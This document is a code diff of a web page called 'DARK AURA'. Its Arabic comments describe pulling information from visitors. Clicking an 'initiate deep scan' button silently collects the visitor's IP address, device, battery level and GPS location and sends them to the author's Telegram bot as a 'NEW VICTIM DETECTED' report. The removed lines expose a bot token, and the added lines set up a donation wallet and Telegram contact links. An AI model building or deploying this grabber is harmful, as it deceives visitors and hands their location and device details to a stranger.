@@ -3,75 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DARK AURA - SYSTEM SCAN</title>
+    <title>DARK AURA</title>
     <style>
-        body {
-            background-color: #000; color: #0f0; font-family: 'Courier New', monospace;
-            text-align: center; padding: 20px; background-image: repeating-linear-gradient(0deg, transparent, transparent 2px, #0a0a0a 2px, #0a0a0a 4px);
-            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
-        }
-        .container {
-            border: 2px solid #f00; padding: 30px; max-width: 600px;
-            box-shadow: 0 0 20px #f00; background: rgba(0,0,0,0.9); border-radius: 10px;
-        }
+        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; background-image: repeating-linear-gradient(0deg, transparent, transparent 2px, #0a0a0a 2px, #0a0a0a 4px); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { border: 2px solid #f00; padding: 30px; max-width: 600px; box-shadow: 0 0 20px #f00; background: rgba(0,0,0,0.9); border-radius: 10px; }
         h1 { color: #f00; text-shadow: 0 0 10px #f00; margin-top: 0; }
         h2 { color: #fff; font-size: 1.2em; margin-bottom: 20px; }
-        p { color: #ccc; line-height: 1.6; font-size: 1.1em;}
+        p { color: #ccc; line-height: 1.6; font-size: 1.1em; }
         .skull { width: 120px; filter: drop-shadow(0 0 15px red); margin: 10px auto; display: block; }
-        button {
-            background: #f00; color: #fff; border: none; padding: 15px 30px; font-size: 18px;
-            cursor: pointer; font-weight: bold; margin-top: 20px; box-shadow: 0 0 10px #f00;
-            font-family: 'Courier New', monospace; letter-spacing: 2px; transition: 0.3s;
-        }
+        button { background: #f00; color: #fff; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; margin-top: 20px; box-shadow: 0 0 10px #f00; font-family: 'Courier New', monospace; letter-spacing: 2px; transition: 0.3s; }
         button:hover { background: #fff; color: #f00; box-shadow: 0 0 20px #fff; }
         #status { color: #ff0; margin-top: 20px; display: none; font-weight: bold; }
-        .footer { margin-top: 30px; font-size: 0.8em; color: #666; border-top: 1px dashed #333; padding-top: 10px; }
+        .footer { margin-top: 30px; font-size: 0.9em; color: #666; border-top: 1px dashed #333; padding-top: 15px; display: flex; flex-direction: column; gap: 10px; }
+        .footer a { color: #00ffff; text-decoration: none; font-weight: bold; }
+        .wallet-box { background: #111; padding: 10px; border: 1px solid #f00; border-radius: 5px; word-break: break-all; font-size: 0.8em; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img id="site-image" class="skull" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Question_book-new.svg/1200px-Question_book-new.svg.png" alt="IMG">
-        <h1 id="site-title">Loading Data...</h1>
-        <h2 id="site-subtitle">Please wait...</h2>
-        <p id="site-content">Connecting to secure server...</p>
+        <img id="site-image" class="skull" src="" alt="IMG">
+        <h1 id="site-title">Loading...</h1>
+        <h2 id="site-subtitle"></h2>
+        <p id="site-content"></p>
         
-        <button id="scanBtn" onclick="startScan()">INITIATE DEEP SCAN</button>
+        <button id="scanBtn" onclick="startScan()">Loading Button...</button>
         <p id="status">Scanning hardware, location, and network...</p>
         
         <div class="footer">
             <p>DEVELOPER: <span id="site-dev" style="color:#f00;">...</span></p>
-            <p>TELEGRAM: <span id="site-tg" style="color:#0ff;">...</span></p>
+            <a id="site-tg-user" href="#" target="_blank">Telegram Contact</a>
+            <a id="site-tg-group" href="#" target="_blank" style="color:#0f0;">Join Telegram Group</a>
+            <div class="wallet-box">
+                <span style="color:#fff;">DONATION WALLET (USDT/ETH):</span><br>
+                <span id="site-wallet" style="color:#0ff;"></span>
+            </div>
         </div>
     </div>
 
     <script>
-        // ==========================================
-        // ⚠️ 1. ضع التوكن والـ ID الخاص بك هنا
-        // ==========================================
-        const BOT_TOKEN = "8908643988:AAGw_F38zhfb2VD9nX9NQLSvtk5onLHq83c";
+        // ⚠️ ضع توكن البوت والـ ID هنا
+        const BOT_TOKEN = "YOUR_NEW_BOT_TOKEN_HERE";
         const CHAT_ID = "8332387485";
 
-        // ==========================================
-        // ⚠️ 2. ضع اسم حسابك في GitHub واسم المستودع
-        // ==========================================
+        // ⚠️ ضع اسم حسابك في GitHub واسم المستودع
         const GITHUB_USER = "cyber-marichal"; 
         const GITHUB_REPO = "M.R_Y.MARICHAL";
         const DATA_URL = `https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/main/data.json`;
 
-        // جلب محتوى الموقع من GitHub (ليتم تحديثه من البوت)
+        // جلب البيانات من GitHub
         fetch(DATA_URL)
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
-                document.getElementById('site-title').innerText = data.title || "DARK AURA";
-                document.getElementById('site-subtitle').innerText = data.subtitle || "";
-                document.getElementById('site-content').innerText = data.content || "";
-                document.getElementById('site-image').src = data.image_url || "";
-                document.getElementById('site-dev').innerText = data.developer || "";
-                document.getElementById('site-tg').innerText = data.telegram || "";
+                document.getElementById('site-title').innerText = data.title;
+                document.getElementById('site-subtitle').innerText = data.subtitle;
+                document.getElementById('site-content').innerText = data.content;
+                document.getElementById('scanBtn').innerText = data.btn_text;
+                document.getElementById('site-image').src = data.image_url;
+                document.getElementById('site-dev').innerText = data.developer;
+                document.getElementById('site-wallet').innerText = data.wallet;
+                
+                const tgUser = document.getElementById('site-tg-user');
+                tgUser.innerText = "Contact: @" + data.telegram_user;
+                tgUser.href = "https://t.me/" + data.telegram_user.replace('@', '');
+                
+                const tgGroup = document.getElementById('site-tg-group');
+                tgGroup.href = data.telegram_group;
             })
-            .catch(err => {
-                document.getElementById('site-title').innerText = "DARK AURA SYSTEM";
-            });
+            .catch(err => console.log(err));
 
         // دوال سحب معلومات الزائر
         async function sendTelegram(message) {
@@ -96,38 +94,29 @@
             document.getElementById('status').style.display = 'block';
 
             let info = "🚨 *NEW VICTIM DETECTED* 🚨\n\n";
-            
-            // 1. جلب الـ IP والجهاز
             const ip = await getIP();
             info += `🌐 *IP:* \`${ip}\`\n`;
             info += `📱 *Device:* ${navigator.userAgent}\n`;
-            info += `🖥️ *Platform:* ${navigator.platform}\n`;
 
-            // 2. جلب البطارية (إذا كان المتصفح يدعم ذلك)
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                info += `🔋 *Battery:* ${Math.round(battery.level * 100)}% ${battery.charging ? "(Charging ⚡)" : ""}\n`;
+                info += `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n`;
             }
 
-            // 3. جلب الموقع (سيطلب المتصفح السماح)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        info += `📍 *Location:* https://www.google.com/maps?q=${lat},${lon}\n`;
+                    (pos) => {
+                        info += `📍 *Location:* https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
                         sendTelegram(info);
-                        document.getElementById('status').innerText = "SCAN COMPLETE. YOUR DATA HAS BEEN LOGGED.";
+                        document.getElementById('status').innerText = "SCAN COMPLETE. DATA LOGGED.";
                         document.getElementById('status').style.color = "red";
                     },
-                    (error) => {
-                        info += `📍 *Location:* Denied by user.\n`;
+                    (err) => {
+                        info += `📍 *Location:* Denied\n`;
                         sendTelegram(info);
                         document.getElementById('status').innerText = "SCAN COMPLETE (Location Denied).";
                     }
                 );
-            } else {
-                sendTelegram(info);
             }
         }
     </script>
